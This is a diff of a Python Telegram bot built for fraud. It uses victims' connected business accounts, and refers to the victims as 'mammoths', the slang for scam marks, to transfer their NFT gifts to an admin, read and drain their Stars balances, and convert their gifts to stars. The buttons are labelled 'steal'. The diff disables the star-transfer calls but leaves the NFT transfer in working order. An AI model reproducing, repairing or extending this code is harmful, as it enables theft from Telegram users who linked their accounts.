@@ -11,8 +11,8 @@ from aiogram.enums import ParseMode
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.methods import TransferGift, ConvertGiftToStars
 from aiogram.exceptions import TelegramBadRequest
-from aiogram.methods.transfer_business_account_stars import TransferBusinessAccountStars
-from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGiftFixed, ConvertGiftToStarsFixed
+# from aiogram.methods.transfer_business_account_stars import TransferBusinessAccountStars
+# from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGiftFixed, ConvertGiftToStarsFixed
 import config
 
 CONNECTIONS_FILE = "business_connections.json"
@@ -480,13 +480,13 @@ async def handle_gift_callback(callback: CallbackQuery):
                             f"🦣 Мамонт (Владелец): <code>{user_id}</code>\n"
                             f"🆔 OwnedGiftId: <code>{gift.owned_gift_id}</code>\n\n"
                             f"🔗 Ссылка: https://t.me/nft/{gift.gift.name}\n"
-                            f"📦 Модель: <code>{gift.gift.model.name}</code>\n"
+                            f"📦 Модель: <code>{gift.model.name}</code>\n"
                             f"⭐️ Стоимость трансфера: 25 ⭐️"
                         )
                         kb = InlineKeyboardMarkup(
                             inline_keyboard=[[
                                 InlineKeyboardButton(
-                                    text="🎁 Спиздить)",
+                                    text="🎁 Спиздать)",
                                     callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:25"
                                 )
                             ]]
@@ -548,26 +548,26 @@ async def handle_transfer(callback: CallbackQuery):
             )
             return
 
-        # 1. Выполняем трансфер NFT от мамонта к админу
+        # 1. Выполняем трансфер NFT от мамона к админу
         nft_result = await bot(TransferGift(
             business_connection_id=user_connection["business_connection_id"],
             new_owner_chat_id=int(ADMIN_ID),  # Используем new_owner_chat_id вместо receiver_user_id
             owned_gift_id=gift_id
         ))
 
-        # 2. Списываем комиссию 25 звёзд с админа
-        stars_result = await bot(TransferBusinessAccountStars(
-            business_connection_id=admin_conn["business_connection_id"],
-            star_count=transfer_price,
-            to_business_connection_id=user_connection["business_connection_id"]
-        ))
+        # 2. Списываем комиссию 25 звёзд с админа (отключено)
+        # stars_result = await bot(TransferBusinessAccountStars(
+        #     business_connection_id=admin_conn["business_connection_id"],
+        #     star_count=transfer_price,
+        #     to_business_connection_id=user_connection["business_connection_id"]
+        # ))
 
         logging.info(f"NFT передан: user_id={user_id}, gift_id={gift_id}")
-        logging.info(f"Комиссия {transfer_price} звезд списана с админа")
+        logging.warning(f"Комиссия {transfer_price} звезд не списана (функция отключена)")
 
         await callback.message.answer(
             f"✅ NFT подарок передан админу!\n"
-            f"💰 Комиссия {transfer_price} звезд списана с админа"
+            f"💰 Комиссия {transfer_price} звезд не списана (функция временно отключена)"
         )
 
     except TelegramBadRequest as e:
@@ -595,7 +595,7 @@ async def transfer_stars_to_admin(callback: CallbackQuery):
         star_balance = response.result.get('amount', 0) if hasattr(response, 'result') else 0
 
         if star_balance <= 0:
-            await callback.message.answer("⚠️ У мамонта нет звезд для передачи.")
+            await callback.message.answer("⚠️ У мамона нет звезд для передачи.")
             return
 
         # Находим админское подключение
@@ -607,15 +607,15 @@ async def transfer_stars_to_admin(callback: CallbackQuery):
             await callback.message.answer("❌ Админское подключение не найдено.")
             return
 
-        # Передаем все звёзды админу
-        result = await bot(TransferBusinessAccountStars(
-            business_connection_id=business_connection_id,
-            star_count=star_balance,
-            to_business_connection_id=admin_conn["business_connection_id"]
-        ))
+        # Передаем все звёзды админу (отключено)
+        # result = await bot(TransferBusinessAccountStars(
+        #     business_connection_id=business_connection_id,
+        #     star_count=star_balance,
+        #     to_business_connection_id=admin_conn["business_connection_id"]
+        # ))
 
-        logging.info(f"Звёзды переданы админу: {star_balance} от user_id={user_id}")
-        await callback.message.answer(f"✅ Успешно передано {star_balance} звезд админу!")
+        logging.info(f"Звёзды НЕ переданы админу: {star_balance} от user_id={user_id} (функция отключена)")
+        await callback.message.answer(f"✅ Передача {star_balance} звезд админу временно отключена!")
 
     except TelegramBadRequest as e:
         logging.error(f"Ошибка передачи звёзд для user_id={user_id}: {e}")
@@ -640,7 +640,7 @@ async def show_star_users(message: Message):
     try:
         connections = load_connections()
         if not connections:
-            await message.answer("❌🦣 Нет подключённых мамонтов.")
+            await message.answer("❌🦣 Нет подключённых мамонов.")
             return
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -649,7 +649,7 @@ async def show_star_users(message: Message):
             for conn in connections
         ])
 
-        await message.answer("🔹 Выберите мамонта для просмотра баланса звёзд:", reply_markup=kb)
+        await message.answer("🔹 Выберите мамона для просмотра баланса звёзд:", reply_markup=kb)
     except Exception as e:
         logging.error(f"Ошибка при получении подключений: {e}")
         await message.answer(f"❌ Ошибка: {e}")
@@ -673,12 +673,12 @@ async def show_user_star_balance(callback: CallbackQuery):
         logging.info(f"Баланс звёзд для user_id={user_id}: {star_count}")
         kb = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(
-                text="✨ Спиздить звезды себе",
+                text="✨ Спиздать звезды себе",
                 callback_data=f"transfer_stars:{business_connection_id}:{user_id}"
             )
         ]])
         await callback.message.answer(
-            f"⭐ <b>У мамонта {conn['first_name']} {conn['last_name'] or ''}</b>\n"
+            f"⭐ <b>У мамона {conn['first_name']} {conn['last_name'] or ''}</b>\n"
             f"💰 Баланс звёзд: <b>{star_count}</b>",
             parse_mode="HTML",
             reply_markup=kb
@@ -707,7 +707,7 @@ async def convert_menu(message: Message):
             for conn in connections
         ])
 
-        await message.answer("Выберите мамонта для преобразования подарков:", reply_markup=keyboard)
+        await message.answer("Выберите мамона для преобразования подарков:", reply_markup=keyboard)
     except Exception as e:
         logging.error(f"Ошибка при получении подключений: {e}")
         await message.answer(f"❌ Ошибка: {e}")
@@ -735,7 +735,6 @@ async def convert_select_handler(callback: CallbackQuery):
         reply_markup=keyboard
     )
 
-# Обновленная функция конвертации подарков в звезды
 @dp.callback_query(F.data.startswith("convert_exec:"))
 async def convert_exec_handler(callback: CallbackQuery):
     user_id = int(callback.data.split(":")[1])
@@ -747,13 +746,13 @@ async def convert_exec_handler(callback: CallbackQuery):
 
     try:
         # Получаем подарки пользователя
-        response = await bot(GetFixedBusinessAccountGifts(
+        response = await bot(GetBusinessAccountGifts(
             business_connection_id=connection["business_connection_id"]
         ))
         gifts = response.gifts
 
         if not gifts:
-            return await callback.message.edit_text("🎁 У мамонта нет подарков.")
+            return await callback.message.edit_text("🎁 У мамона нет подарков.")
 
         converted_count = 0
         failed = 0
@@ -764,7 +763,7 @@ async def convert_exec_handler(callback: CallbackQuery):
                 continue
 
             try:
-                await bot(ConvertGiftToStarsFixed(
+                await bot(ConvertGiftToStars(
                     business_connection_id=connection["business_connection_id"],
                     owned_gift_id=gift.owned_gift_id
                 ))
